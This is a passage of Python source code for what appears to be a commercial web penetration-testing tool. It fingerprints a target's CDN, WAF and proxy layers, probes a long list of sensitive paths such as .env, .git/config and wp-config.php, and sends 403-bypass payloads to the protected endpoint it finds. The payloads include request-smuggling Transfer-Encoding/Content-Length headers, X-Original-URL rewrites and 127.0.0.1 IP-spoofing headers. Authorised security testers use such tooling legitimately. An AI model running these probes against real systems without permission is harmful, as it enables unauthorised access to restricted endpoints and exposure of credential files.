                            headers_list = fingerprint_data.get('headers', [])

                            evidence = []
                            confidence_boost = 0

                            # Check body patterns
                            for pattern in body_patterns:
                                if pattern.lower() in response.text.lower():
                                    evidence.append(f"Body: {pattern}")
                                    confidence_boost += 15

                            # Check headers
                            for header_pattern in headers_list:
                                for header_name in response.headers.keys():
                                    if header_pattern.lower() in header_name.lower():
                                        evidence.append(f"Header: {header_name}")
                                        confidence_boost += 10

                            if evidence:
                                paths_discovered.append({
                                    'category': category,
                                    'component': component_name,
                                    'path': path,
                                    'response_code': response.status_code,
                                    'evidence': evidence,
                                    'confidence_boost': confidence_boost
                                })

                                self.log("BEHAVIORAL",
                                        f"Found {component_name} evidence at {path} (+{confidence_boost} confidence)",
                                        "SUCCESS")

                    except Exception as e:
                        continue

        self.log("BEHAVIORAL", f"Tested {all_paths_tested} paths, found {len(paths_discovered)} with evidence", "INFO")
        self.stack['behavioral_discoveries'] = paths_discovered
        return paths_discovered

    def detect_hidden_layers(self):
        """
        Detect layers that don't leave obvious headers.

        Runs deep fingerprinting for API Gateway and Service Mesh (which are
        typically not announced in the header timeline) and falls back to
        timing-based heuristics for transparent proxies / load balancers.
        """
        self.log("HIDDEN", "Searching for hidden layers (API Gateway, Service Mesh, etc.)...", "DISCOVERY")

        # Existing layer types – avoid duplicating what progressive_fingerprinting found
        existing_types = {layer['type'] for layer in self.stack['layers']}

        # --- API Gateway ---
        if 'API_GATEWAY' not in existing_types:
            try:
                # Use a lightweight probe response for the deep fingerprinter
                probe = self.session.get(self.target_url, timeout=5)
                self.deep_api_gateway_fingerprinting(probe)
            except Exception:
                pass

        # --- Service Mesh ---
        if 'SERVICE_MESH' not in existing_types:
            try:
                probe = self.session.get(self.target_url, timeout=5)
                self.deep_service_mesh_fingerprinting(probe)
            except Exception:
                pass

        # --- Timing-based heuristic for transparent load balancers ---
        if 'LOAD_BALANCER' not in {layer['type'] for layer in self.stack['layers']}:
            latencies = []
            for _ in range(3):
                start = time.time()
                try:
                    self.session.get(self.target_url, timeout=5)
                    latencies.append((time.time() - start) * 1000)
                except Exception:
                    pass

            if latencies:
                jitter = max(latencies) - min(latencies)
                # Threshold dinamico da SQLite (TASK 4.7)
                lb_jitter_threshold = (
                    self.learning_db.get_prior(
                        f'traceroute.hidden_lb.jitter_threshold.{_hash_target(self.target_url)}',
                        static_fallback=100.0
                    )
                    if hasattr(self, 'learning_db') and self.learning_db else 100.0
                )
                if jitter > lb_jitter_threshold:
                    self.stack['layers'].append({
                        'type': 'LOAD_BALANCER',
                        'component': 'hidden_lb_via_timing',
                        'confidence': 40,
                        'level': 'LOW',
                        'evidence': [f'Timing jitter: {jitter:.2f}ms (threshold: {lb_jitter_threshold:.0f}ms)'],
                        'source': 'timing_heuristic',
                    })
                    self.log("HIDDEN", f"Possible hidden load balancer (jitter: {jitter:.2f}ms)", "WARNING")
    
    def _measure_latency(self) -> float:
        """Measure average latency for timing analysis"""
        latencies = []
        for _ in range(3):
            start = time.time()
            try:
                self.session.head(self.target_url, timeout=5)
                latencies.append((time.time() - start) * 1000)
            except:
                pass
        return sum(latencies) / len(latencies) if latencies else 0
    
    def correlate_stack(self):
        """
        ENHANCED: Correlate discovered layers with timing, header attribution, and responsibility.
        Example: CDN(30ms) → WAF(10ms) → Load Balancer(15ms) → Backend(45ms)
        """
        self.log("CORRELATION", "Building enhanced stack relationships...", "INFO")

        # Sort layers by typical order
        order_priority = {
            'CDN': 1, 'WAF': 2, 'API_GATEWAY': 3, 'LOAD_BALANCER': 4,
            'SERVICE_MESH': 5, 'PROXY': 6, 'CACHE': 7, 'FRAMEWORK': 8,
            'BACKEND': 9, 'DATABASE': 10, 'CMS': 11,
        }
        self.stack['layers'].sort(key=lambda x: order_priority.get(x['type'], 99))

        # Measure timing per layer (simplified - estimate based on position)
        total_latency = self._measure_latency()
        stack_sig = _build_stack_signature(self.stack['layers'])
        estimated_latencies = self._estimate_layer_latencies(total_latency, stack_sig)

        # Build enhanced correlations
        for i in range(len(self.stack['layers']) - 1):
            current = self.stack['layers'][i]
            next_layer = self.stack['layers'][i + 1]

            # Add timing information
            current_timing = estimated_latencies.get(current['type'], 0)

            # Header attribution - which layer introduced which headers
            header_attribution = self._attribute_headers(current, i)

            # Responsibility - which layer blocked/modified request
            responsibility = self._determine_responsibility(current)

            self.stack['correlations'].append({
                'from': f"{current['type']}:{current['component']}",
                'to': f"{next_layer['type']}:{next_layer['component']}",
                'relationship': 'forwards_to',
                'timing_ms': current_timing,
                'headers_added': header_attribution,
                'responsibility': responsibility
            })

        # Log the enhanced chain
        if self.stack['layers']:
            # When multiple layers share the same type (e.g. two FRAMEWORK detections),
            # divide that type's allocated latency evenly so each shows a distinct value
            # instead of both printing the same number.
            type_counts: Dict[str, int] = {}
            for layer in self.stack['layers']:
                type_counts[layer['type']] = type_counts.get(layer['type'], 0) + 1

            chain_parts = []
            for layer in self.stack['layers']:
                t = layer['type']
                timing = estimated_latencies.get(t, 0) / type_counts[t]
                chain_parts.append(f"{t}({layer['component']},{timing:.0f}ms)")
            chain = " → ".join(chain_parts)
            self.log("CORRELATION", f"Stack chain: {chain}", "SUCCESS")
            self.log("CORRELATION", f"Total latency: {total_latency:.2f}ms", "INFO")

    _STATIC_LATENCY_DISTRIBUTION = {
        'CDN':           0.20,
        'WAF':           0.08,
        'API_GATEWAY':   0.07,
        'LOAD_BALANCER': 0.10,
        'SERVICE_MESH':  0.05,
        'PROXY':         0.08,
        'CACHE':         0.02,
        'FRAMEWORK':     0.10,
        'BACKEND':       0.25,
        'DATABASE':      0.05,  # DB latency è parte del backend, non separata
        'CMS':           0.00,  # CMS è application-layer, non aggiunge latenza di rete
    }

    def _estimate_layer_latencies(self, total_latency: float,
                                   stack_sig: str = 'unknown') -> Dict[str, float]:
        """Estimate latency contribution per layer type.

        Percentages empirici; in regime dynamic vengono sostituiti con valori
        appresi da SQLite (TASK 4.8). stack_sig usato come chiave prior.
        """
        distribution = {}
        for layer_type, static_pct in self._STATIC_LATENCY_DISTRIBUTION.items():
            if hasattr(self, 'learning_db') and self.learning_db:
                distribution[layer_type] = self.learning_db.get_prior(
                    f'traceroute.latency_pct.{layer_type}.{stack_sig}',
                    static_fallback=static_pct
                )
            else:
                distribution[layer_type] = static_pct

        # Normalise to the actual layers present so totals are consistent
        present = {layer['type'] for layer in self.stack['layers']}
        subset = {k: v for k, v in distribution.items() if k in present}
        total_share = sum(subset.values()) or 1.0

        latencies = {
            k: total_latency * (v / total_share)
            for k, v in subset.items()
        }
        # Any type not in distribution gets a proportional residual
        for layer_type in present - set(distribution):
            latencies[layer_type] = total_latency * 0.05

        return latencies

    def _attribute_headers(self, layer: Dict, position: int) -> List[str]:
        """
        Determine which headers this layer likely added by dynamically 
        extracting them from the comprehensive fingerprints database.
        """
        header_attribution = []
        layer_type = layer['type'].upper()
        
        # Map layer types to fingerprint categories
        type_mapping = {
            'CDN': ['cdn_detection'],
            'WAF': ['waf_detection'],
            'LOAD_BALANCER': ['load_balancer_detection'],
            'PROXY': ['proxy_detection', 'api_gateway_detection', 'service_mesh_detection'],
            'BACKEND': ['backend_detection', 'microservice_detection', 'serverless_detection']
        }
        
        relevant_categories = type_mapping.get(layer_type, [])
        
        # Dynamically build the signature list from self.fingerprints
        for category in relevant_categories:
            if category in self.fingerprints:
                for provider in self.fingerprints[category].values():
                    # Extract from 'headers' list if available
                    if 'headers' in provider:
                        if isinstance(provider['headers'], list):
                            header_attribution.extend(provider['headers'])
                        elif isinstance(provider['headers'], dict):
                            header_attribution.extend(provider['headers'].keys())
                    
                    # Extract from 'tech_headers' (common in backend_detection)
                    if 'tech_headers' in provider:
                        header_attribution.extend(provider['tech_headers'].keys())

        # Clean and deduplicate (removing versions or values from header names)
        cleaned_headers = []
        for h in header_attribution:
            # Take only the header name part before any colon or space
            clean_name = h.split(':')[0].strip().lower()
            if clean_name and clean_name not in cleaned_headers:
                cleaned_headers.append(clean_name)
        
        return cleaned_headers

    def _determine_responsibility(self, layer: Dict) -> str:
        """Determine layer's role in request processing"""
        layer_type = layer['type']

        responsibilities = {
            'CDN': 'edge_caching',
            'WAF': 'security_filtering',
            'LOAD_BALANCER': 'traffic_distribution',
            'PROXY': 'request_forwarding',
            'BACKEND': 'application_logic'
        }

        return responsibilities.get(layer_type, 'unknown')


class ForbiddenEndpointFinder:
    """
    Finds a real 403/401 forbidden endpoint for bypass testing.
    """
    
    def __init__(self, target_url: str, session: requests.Session):
        self.target_url = target_url.rstrip('/')
        self.session = session
    
    def find(self, user_provided: Optional[str] = None) -> Optional[str]:
        """Find forbidden endpoint"""
        print("\n🔍 Phase 0: Finding Forbidden Endpoint for Bypass Testing")
        print("=" * 70)
        
        # If user provided one, validate it
        if user_provided:
            if self._is_truly_forbidden(user_provided):
                print(f"  ✅ User-provided endpoint validated: {user_provided}")
                return user_provided
            else:
                print(f"  ⚠️ User-provided endpoint doesn't return 403/401, searching alternatives...")
        
        # Common forbidden paths
        common_paths = [

            # Database administration
            '/phpmyadmin', '/pma', '/adminer', '/mysql', '/database',
            '/db', '/dbadmin', '/sqlmanager', '/myadmin', '/phpMyAdmin',
            '/mysqladmin', '/sql', '/db_admin', '/database_administration',
            
            # User management and authentication
            '/users', '/user', '/accounts', '/account', '/profile', '/profiles',
            '/login', '/signin', '/auth', '/authentication', '/oauth',
            '/sso', '/saml', '/ldap', '/register', '/signup',
            
            # API endpoints
            '/api', '/api/v1', '/api/v2', '/api/admin', '/api/internal',
            '/api/private', '/api/user', '/api/users', '/api/auth',
            '/api/login', '/api/admin/users', '/api/config', '/api/settings',
            '/graphql', '/graphiql', '/playground', '/altair',
            
            # Content Management Systems (CMS)
            '/wp-admin', '/wp-login.php', '/wp-content', '/wp-includes',
            '/wp-json', '/xmlrpc.php', '/wp-cron.php',
            '/drupal', '/sites/default', '/node', '/user/login',
            '/joomla', '/joomla/administrator', '/typo3', '/umbraco',
            
            # Development and staging
            '/dev', '/development', '/test', '/testing', '/stage', '/staging',
            '/debug', '/trace', '/logs', '/log', '/monitoring',
            '/health', '/status', '/info', '/version', '/build',
            
            # System directories
            '/pages', '/root', '/home', '/var', '/etc', '/tmp',
            '/uploads', '/upload', '/files', '/documents', '/media',
            '/images', 'Images',  '/assets', '/static', '/resources',
            '/includes', '/lib', '/libraries', '/vendor',
            '/cgi-bin', '/cgi', '/bin', '/scripts',
            
            # Backup and archive files
            '/backup', '/backups', '/bak', '/old', '/archive',
            '/dump', '/sql', '/.bak', '/backup.zip', '/backup.tar.gz',
            '/db_backup.sql', '/database.sql', '/data.sql',
            
            # Server status and monitoring
            '/server-status', '/server-info', '/status', '/stats',
            '/metrics', '/health', '/ping', '/heartbeat',
            '/actuator', '/actuator/health', '/actuator/info', '/actuator/metrics',
            '/management', '/jolokia', '/hawtio',
            
            # Framework specific endpoints
            # Spring Boot
            '/actuator', '/actuator/beans', '/actuator/env', '/actuator/configprops',
            '/actuator/mappings', '/actuator/sessions', '/actuator/shutdown',
            '/actuator/trace', '/actuator/dump', '/actuator/jolokia',
            '/actuator/logfile', '/actuator/refresh', '/actuator/restart',
            
            # Django
            '/django-admin', '/__debug__', '/admin/doc', '/admin/auth',
            
            # Laravel
            '/telescope', '/horizon', '/nova', '/log-viewer',
            
            # Node.js/Express
            '/debug', '/_debugger', '/inspector', '/profiler',
            
            # Flask
            '/admin', '/admin/login', '/_debug_toolbar',
            
            # Documentation endpoints
            '/docs', '/doc', '/documentation', '/swagger', '/swagger-ui',
            '/swagger.json', '/swagger.yaml', '/openapi.json',
            '/redoc', '/api-docs', '/apidocs', '/api/docs',
            
            # Security tools and panels
            '/security', '/firewall', '/waf', '/ids', '/ips',
            '/antivirus', '/scanner', '/audit', '/compliance',
            
            # Cloud and container specific
            '/kubernetes', '/k8s', '/docker', '/containers',
            '/pods', '/services', '/ingress', '/metrics-server',
            '/prometheus', '/grafana', '/jaeger', '/zipkin',
            
            # CI/CD and DevOps
            '/jenkins', '/bamboo', '/teamcity', '/gitlab',
            '/github', '/bitbucket', '/azure-devops', '/travis',
            '/circleci', '/drone', '/argo', '/tekton',
            
            # Specific application panels
            '/nagios', '/zabbix', '/cacti', '/munin', '/icinga',
            '/kibana', '/elasticsearch', '/logstash', '/splunk',
            '/sonarqube', '/nexus', '/artifactory', '/harbor',
            
            # E-commerce specific
            '/checkout', '/payment', '/billing', '/invoice',
            '/orders', '/cart', '/wishlist', '/customer',
            '/merchant', '/vendor', '/seller',
            
            # Communication tools
            '/mail', '/webmail', '/roundcube', '/squirrelmail',
            '/horde', '/zimbra', '/exchange', '/outlook',
            '/chat', '/slack', '/teams', '/discord',
            
            # File management
            '/filemanager', '/ftp', '/sftp', '/files', '/explorer',
            '/finder', '/directory', '/browse', '/tree',
            
            # Miscellaneous sensitive paths
            '/internal', '/intranet', '/extranet', '/partner',
            '/client', '/customer', '/member', '/premium',
            '/vip', '/executive', '/board', '/leadership',
            '/hr', '/finance', '/accounting', '/legal',
            
            # Version control and source code
            '/.svn', '/.hg', '/.bzr', '/CVS',
            '/src', '/source', '/sources', '/code',
            
            # Cache and temporary files
            '/cache', '/tmp', '/temp', '/temporary',
            '/session', '/sessions', '/var/cache', '/var/tmp',
            
            # Mobile and API gateways
            '/mobile', '/m', '/api/mobile', '/mobile-api',
            '/gateway', '/proxy', '/reverse-proxy',
            
            # Analytics and tracking
            '/analytics', '/tracking', '/stats', '/reports',
            '/dashboard', '/overview', '/summary',
            
            # Backup services
            '/backup', '/restore', '/snapshot', '/clone',
            '/export', '/import', '/migrate', '/sync',
            
            # Third-party integrations
            '/oauth2', '/openid', '/cas', '/radius',
            '/active-directory', '/ldap', '/saml2',
            '/facebook', '/google', '/twitter', '/linkedin',
            '/github', '/gitlab', '/bitbucket',
            
            # Error and debug pages
            '/error', '/errors', '/404', '/500', '/debug',
            '/trace', '/exception', '/stacktrace',
            
            # Testing and QA
            '/qa', '/quality', '/test-results', '/coverage',
            '/performance', '/load-test', '/stress-test',
            
            # Additional file extensions that might be protected
            '/.DS_Store', '/thumbs.db', '/.vscode', '/.idea',
            '/composer.json', '/package.json', '/yarn.lock',
            '/Gemfile', '/requirements.txt', '/pom.xml',
            '/build.gradle', '/Dockerfile', '/docker-compose.yml',
                        # Original admin endpoints
            '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
            '/manage', '/console', '/portal', '/control', '/private',
            '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
            
            # Configuration and sensitive files
            '/.env', '/.env.local', '/.env.production', '/.env.backup',
            '/.git', '/.git/config', '/.gitignore', '/.gitlab-ci.yml',
            '/config', '/config.php', '/config.json', '/config.yml',
            '/configuration.php', '/wp-config.php', '/app.config',
            '/.htaccess', '/.htpasswd', '/web.config', '/robots.txt',
            '/sitemap.xml', '/.well-known'
        
        ]
        
        print(f"  🔎 Testing {len(common_paths)} common forbidden paths...")
        
        for path in common_paths:
            url = self.target_url + path
            if self._is_truly_forbidden(url):
                print(f"  ✅ Found forbidden endpoint: {path}")
                return url
        
        print("  ⚠️ No forbidden endpoint found - bypass testing will be limited")
        return None
    
    def _is_truly_forbidden(self, url: str) -> bool:
        """Check if URL returns true 403/401 (not redirect)"""
        try:
            headers = {
                'User-Agent': get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = self.session.get(url, headers=headers, timeout=5, allow_redirects=False)
            
            # True forbidden: 401/403 without redirect
            if response.status_code in [401, 403] and response.status_code != 302:
                return True
            
            return False
        except:
            return False


class DiscrepancyTester:
    """
    Tests for parser discrepancies between stack layers.
    CRITICAL: Uses the REAL forbidden endpoint, not hardcoded paths!
    """

    def __init__(self, target_url: str, forbidden_endpoint: str, session: requests.Session, stack_analyzer: ProgressiveStackAnalyzer):
        self.target_url = target_url.rstrip('/')
        self.forbidden_endpoint = forbidden_endpoint
        self.session = session
        self.stack_analyzer = stack_analyzer
        self.discrepancies = []

        # Rate limiter to prevent overwhelming target
        self.rate_limiter = RateLimiter(requests_per_second=2.5)

        # Additional attributes for advanced tests
        self.parsed_url = urlparse(target_url)
        self.discovered_forbidden_endpoint = forbidden_endpoint
        self.skip_forbidden_tests = not forbidden_endpoint

        # Use auto-detected protocols from stack analyzer
        self.protocols = stack_analyzer.stack.get('protocols', {
            'http1': True,
            'http2': False,
            'http3': False,
            'websocket': False,
            'grpc': False
        })

        self.chain_map = {'discrepancies': self.discrepancies}  # Alias for compatibility

        # SQLite Learning System — iniettato dall'esterno (ApplicationTraceroute)
        self.learning_db = None
        self.scan_id = None

        # Pre-fetch homepage fingerprint to detect path-normalization false positives.
        # Many path variants (e.g. /admin/..) get normalised by the server to '/'
        # and return the homepage with a 200, which is NOT a real bypass.
        self._homepage_fingerprint = self._fetch_homepage_fingerprint()

        # === ADVANCED MODULES INITIALIZATION ===
        self.advanced_enabled = ADVANCED_MODULES_AVAILABLE
        self.differential_analyzer = None
        self.semantic_engine = None
        self.attack_planner = None
        self.intelligent_validator = None

        if self.advanced_enabled and forbidden_endpoint:
            try:
                print("  🧠 Initializing Advanced Bypass Engines...")

                # baseline_samples dinamico da SQLite se disponibile (TASK 4.10)
                _n_samples = 3
                if LEARNING_DB_AVAILABLE:
                    _tmp_db = LearningDB()
                    _n_samples = int(_tmp_db.get_prior(
                        f'traceroute.baseline_samples.{_hash_target(target_url)}',
                        static_fallback=3.0
                    ))
                    del _tmp_db

                # ResponseDifferentialAnalyzer with Bayesian inference
                self.differential_analyzer = ResponseDifferentialAnalyzer(
                    self.session,
                    self.forbidden_endpoint,
                    baseline_samples=_n_samples
                )

                # SemanticBypassEngine with evolutionary algorithms
                self.semantic_engine = SemanticBypassEngine()

                # GraphAttackPlanner with game theory
                self.attack_planner = GraphAttackPlanner()

                # IntelligentBypassValidator for inline confirmation of hits.
                # Shares the same session and baseline — no extra baseline requests at init.
                rps = (1.0 / self.rate_limiter.delay) if self.rate_limiter.delay > 0 else 2.0
                self.intelligent_validator = IntelligentBypassValidator(
                    session=self.session,
                    baseline_url=self.forbidden_endpoint,
                    rate_limit=rps
                )

                print("  ✅ Advanced engines initialized successfully")
            except Exception as e:
                print(f"  ⚠️  Advanced engines initialization failed: {str(e)}")
                self.advanced_enabled = False

    def inject_learning_db(self, learning_db, scan_id: int):
        """
        Inietta LearningDB e scan_id in questo tester e in tutti i componenti avanzati.
        Chiamato da ApplicationTraceroute dopo la costruzione (TASK 4.1, 4.2, 4.5, 4.6, 2.1).
        """
        self.learning_db = learning_db
        self.scan_id = scan_id

        if not learning_db:
            return

        stack_sig = _build_stack_signature(self.stack_analyzer.stack.get('layers', []))

        # TASK 4.1 — prior bayesiano da SQLite per BayesianBypassInference
        if self.differential_analyzer and ADVANCED_MODULES_AVAILABLE:
            prior = learning_db.get_prior(
                f'traceroute.bayesian.bypass_prior.{stack_sig}',
                static_fallback=0.05
            )
            self.differential_analyzer.bayesian_engine = BayesianBypassInference(
                prior_probability=prior
            )
            # TASK 4.6 — likelihood ratios e scan_id per record osservazioni
            self.differential_analyzer.learning_db = learning_db
            self.differential_analyzer.stack_sig = stack_sig
            self.differential_analyzer.scan_id = scan_id

        # TASK 4.2 — bypassability ceiling dinamico in SemanticBypassEngine
        if self.semantic_engine:
            self.semantic_engine.learning_db = learning_db
            self.semantic_engine._current_stack_sig = stack_sig

        # TASK 4.5 — prior dinamici GraphAttackPlanner
        if self.attack_planner:
            self.attack_planner.learning_db = learning_db
            self.attack_planner.stack_sig = stack_sig
            if hasattr(self.attack_planner, '_load_dynamic_priors'):
                self.attack_planner._load_dynamic_priors()

        # TASK 2.1 — soft-block logging in IntelligentBypassValidator
        if self.intelligent_validator:
            self.intelligent_validator.learning_db = learning_db
            self.intelligent_validator.scan_id = scan_id

    def generate_unique_markers(self) -> Dict[str, str]:
        """Generate unique markers for tracking requests"""
        import uuid
        return {
            'uuid': str(uuid.uuid4()),
            'timestamp': str(int(time.time())),
            'random': ''.join(random.choices(string.ascii_letters, k=16))
        }

    def log_discovery(self, category: str, subcategory: str, message: str):
        """Log discovery information"""
        timestamp = time.strftime('%H:%M:%S')
        print(f"    [{timestamp}] [{category}:{subcategory}] {message}")

    def send_request_with_duplicate_headers(self, method: str, url: str, headers_list: List[Tuple[str, str]], data: str = None, timeout: int = 5) -> requests.Response:
        """
        Send HTTP request with duplicate headers using PreparedRequest.

        Args:
            method: HTTP method (GET, POST, etc.)
            url: Target URL
            headers_list: List of (header_name, header_value) tuples (allows duplicates)
            data: Request body
            timeout: Request timeout

        Returns:
            Response object
        """
        req = requests.Request(method, url, data=data)
        prepared = self.session.prepare_request(req)

        # Override headers with duplicate support
        prepared.headers = requests.structures.CaseInsensitiveDict()
        for header_name, header_value in headers_list:
            if header_name in prepared.headers:
                # Append to existing header with comma separator
                prepared.headers[header_name] = f"{prepared.headers[header_name]}, {header_value}"
            else:
                prepared.headers[header_name] = header_value

        return self.session.send(prepared, timeout=timeout, verify=False, allow_redirects=False)

    def calculate_severity(self, discrepancy_type: str, response_code: int = None, context: Dict = None) -> Tuple[str, float]:
        """
        Calculate severity score for discovered discrepancy.
        Returns: (severity_level, cvss_score)

        Severity Levels:
        - CRITICAL (9.0-10.0): RCE, Auth Bypass, Full Stack Smuggling
        - HIGH (7.0-8.9): Cache Poisoning, WAF Bypass, Injection
        - MEDIUM (4.0-6.9): Header Manipulation, Encoding Confusion
        - LOW (0.1-3.9): Information Disclosure, Timing Differences
        """
        context = context or {}

        # CRITICAL Severity (9.0-10.0)
        critical_types = {
            'HTTP Smuggling': 9.8,
            'TOCTOU Race': 9.5,
            'GraphQL-REST Confusion': 9.3,
            'Container Orchestration': 9.0
        }

        # HIGH Severity (7.0-8.9)
        high_types = {
            'Protocol Tunneling': 8.5,
            'Parser State Confusion': 8.3,
            'Host Header Attack': 8.0,
            'Integer Overflow': 7.8,
            'ML WAF Evasion': 7.5,
            'Cache Key Confusion': 7.3,
            'Nested Encoding': 7.0
        }

        # MEDIUM Severity (4.0-6.9)
        medium_types = {
            'Header Confusion': 6.5,
            'Method Confusion': 6.0,
            'Parameter Pollution': 5.8,
            'Encoding Discrepancy': 5.5,
            'Unicode Confusion': 5.3,
            'Buffer Boundary': 5.0,
            'Protocol Confusion': 4.5,
            'Content-Type Confusion': 4.3
        }

        # LOW Severity (0.1-3.9)
        low_types = {
            'Path Normalization': 3.5,
            'Timing Race Condition': 3.0,
            'Parser Complexity': 2.5,
            'Encoding Confusion': 2.0,
            'TCP Fragmentation': 3.8,
            'Compression Bypass': 3.5,
            'QUIC/HTTP3': 3.0
        }

        # Base score lookup
        base_score = 0.0
        severity = "INFO"

        if discrepancy_type in critical_types:
            base_score = critical_types[discrepancy_type]
            severity = "CRITICAL"
        elif discrepancy_type in high_types:
            base_score = high_types[discrepancy_type]
            severity = "HIGH"
        elif discrepancy_type in medium_types:
            base_score = medium_types[discrepancy_type]
            severity = "MEDIUM"
        elif discrepancy_type in low_types:
            base_score = low_types[discrepancy_type]
            severity = "LOW"
        else:
            # Default for unknown types
            base_score = 5.0
            severity = "MEDIUM"

        # Adjust based on response code
        if response_code:
            if response_code == 200:
                # Full bypass - increase severity
                base_score = min(10.0, base_score + 1.5)
                if base_score >= 9.0:
                    severity = "CRITICAL"
                elif base_score >= 7.0:
                    severity = "HIGH"
            elif response_code in [500, 502, 503]:
                # Server error - might indicate vulnerability
                base_score = min(10.0, base_score + 0.5)
            elif response_code == 403:
                # Still blocked - reduce severity slightly
                base_score = max(0.1, base_score - 0.3)

        # Adjust based on context
        if context.get('admin_access'):
            base_score = min(10.0, base_score + 2.0)
            severity = "CRITICAL"

        if context.get('data_exposure'):
            base_score = min(10.0, base_score + 1.0)

        if context.get('auth_bypass'):
            base_score = min(10.0, base_score + 2.5)
            severity = "CRITICAL"

        # Ensure severity matches score
        if base_score >= 9.0:
            severity = "CRITICAL"
        elif base_score >= 7.0:
            severity = "HIGH"
        elif base_score >= 4.0:
            severity = "MEDIUM"
        else:
            severity = "LOW"

        return severity, round(base_score, 1)
    
    def test_all_discrepancies(self):
        """Run all discrepancy tests on the REAL forbidden endpoint - FULLY EXPANDED"""
        print("\n🧪 Phase 3: Parser Discrepancy Testing")
        print("=" * 70)

        if not self.forbidden_endpoint:
            print("  ⚠️ No forbidden endpoint available - skipping discrepancy tests")
            return

        print(f"  🎯 Target: {self.forbidden_endpoint}")
        print(f"  📊 Testing against reconstructed stack: {len(self.stack_analyzer.stack['layers'])} layers")

        # Original tests
        discrepancy_tests = [
            self.test_http_smuggling,
            self.test_unicode_confusion,
            self.test_encoding_discrepancies,
            self.test_header_confusion,
            self.test_method_confusion,
            self.test_path_normalization,
            self.test_parameter_pollution,
            self.test_tcp_fragmentation,
            self.test_compression_bomb,
            self.test_timing_race_conditions,
            # New advanced tests
            self.test_parser_state_confusion,
            self.test_buffer_boundary_discrepancies,
            self.test_nested_encoding_confusion,
            self.test_protocol_tunneling_discrepancies,
            self.test_cache_key_confusion,
            self.test_parser_backtracking_dos,
            self.test_integer_overflow_length,
            self.test_toctou_race_conditions,
            self.test_quic_http3_confusion,
            self.test_ml_waf_evasion,
            self.test_container_orchestration_bypass,
            self.test_graphql_rest_confusion,
            # Additional tests from earlier version
            self.test_protocol_confusion,
            self.test_encoding_confusion,
            self.test_content_type_confusion,
            self.test_anchor_tag_mutations,            # <a> tag mutation points (WAF bypass)
            self.test_host_header_attacks,
            # === v4.0 REVOLUTIONARY ADVANCED TESTS ===
            self.test_advanced_response_differential,  # Bayesian + Statistical
            self.test_semantic_bypass_discovery,       # NLP + Evolutionary
            self.test_graph_optimized_attack_chain     # Graph Theory + Game Theory
        ]

        for _test_idx, test in enumerate(discrepancy_tests):
            # Periodic integrity + license re-validation every 5 tests
            if _test_idx > 0 and _test_idx % 5 == 0:
                try:
                    from core._security import runtime_check as _rtc
                    _rtc()
                    from core.license_manager import check_license as _cl
                    if _cl() is None:
                        print("  [!] License validation failed. Stopping analysis.")
                        break
                except SystemExit:
                    raise
                except Exception:
                    pass
            try:
                test()
            except Exception as e:
                print(f"  ❌ Error in {test.__name__}: {str(e)}")

        print(f"\n  📊 Total discrepancies found: {len(self.discrepancies)}")
        return self.discrepancies
    
    def test_header_confusion(self):
        """
        Advanced testing for header parsing discrepancies, smuggling, 
        and proxy bypass signatures.
        """
        print("\n  🔬 Testing Header Confusion & Proxy Bypasses...")

        # Each test can have a dict of headers or a list of tuples for duplicate headers
        header_tests = [
            # 1. Smuggling & Parsing Discrepancies
            {
                'name': 'TE.CL Smuggling (Chunked, Identity)',
                'headers': {'Transfer-Encoding': 'chunked, identity', 'Content-Length': '5'}
            },
            {
                'name': 'CL.TE Smuggling (Zero CL)',
                'headers': {'Content-Length': '0', 'Transfer-Encoding': 'chunked'}
            },
            {
                'name': 'Header Name Obfuscation (Tab)',
                'headers': {'X-Forwarded-For\t': '127.0.0.1'}
            },
            {
                'name': 'Header Value Obfuscation (Prefix Space)',
                'headers': {'X-Forwarded-For': ' 127.0.0.1'}
            },
            {
                'name': 'Case Sensitivity Test',
                'headers': {'tRaNsFeR-eNcOdInG': 'chunked'}
            },

            # 2. Path & URL Rewrite Bypasses
            {
                'name': 'X-Original-URL Bypass',
                'headers': {'X-Original-URL': self.forbidden_endpoint.split(self.target_url)[-1]}
            },
            {
                'name': 'X-Rewrite-URL Bypass',
                'headers': {'X-Rewrite-URL': self.forbidden_endpoint.split(self.target_url)[-1]}
            },
            {
                'name': 'X-Forwarded-Server Override',
                'headers': {'X-Forwarded-Server': 'localhost'}
            },

            # 3. IP/Identity Spoofing
            {
                'name': 'Multi-Proxy Chain Spoofing',
                'headers': {
                    'X-Forwarded-For': '127.0.0.1, 10.0.0.1, 192.168.1.1',
                    'X-Real-IP': '127.0.0.1',
                    'Client-IP': '127.0.0.1'
                }
            },
            {
                'name': 'Source IP Confusion',
                'headers': {
                    'X-Originating-IP': '127.0.0.1',
                    'X-Remote-IP': '127.0.0.1',
                    'X-Remote-Addr': '127.0.0.1',
                    'X-Client-IP': '127.0.0.1',
                    'True-Client-IP': '127.0.0.1'
                }
            },

            # 4. Hop-by-Hop Header Manipulation
            {
                'name': 'Connection-based Header Dropping',
                'headers': {
                    'Connection': 'close, X-Forwarded-For',
                    'X-Forwarded-For': '127.0.0.1'
                }
            },
            {
                'name': 'Hop-by-Hop Te Manipulation',
                'headers': {'Connection': 'TE', 'TE': 'trailers'}
            },

            # 5. Infrastructure Specific Confusion
            {
                'name': 'Cloudflare Internal Bypass Attempt',
                'headers': {'CF-Connecting-IP': '127.0.0.1', 'X-Forwarded-Proto': 'http'}
            },
            {
                'name': 'Akamai Network-Override',
                'headers': {'Akamai-Origin-Hop': '1', 'X-Akamai-Edge-Check': 'true'}
            },
            {
                'name': 'Fastly Debug Bypass',
                'headers': {'Fastly-Debug': '1', 'X-Timer': 'S1'}
            },

            # 6. Content-Type Confusion (Using variations instead of duplicate keys)
            {
                'name': 'Content-Type Multiplexing',
                'headers': {
                    'Content-Type': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded'
                }
            },

            # 7. Protocol Downgrade/Upgrade Confusion
            {
                'name': 'Upgrade-Insecure-Requests',
                'headers': {'Upgrade-Insecure-Requests': '1'}
            },
            {
                'name': 'Protocol Header Confusion',
                'headers': {'X-Forwarded-Proto': 'https', 'Forwarded': 'proto=http'}
            }
        ]
        
        for test in header_tests:
            try:
                # Apply rate limiting
                self.rate_limiter.wait()

                # Use a new request to avoid session header pollution
                response = self.session.get(
                    self.forbidden_endpoint,
                    headers=test['headers'],
                    timeout=5,
                    allow_redirects=False
                )
                
                # Analyze results for potential bypass or leakage
                status = response.status_code
                content_len = len(response.content)

                # Check for bypass (status code change)
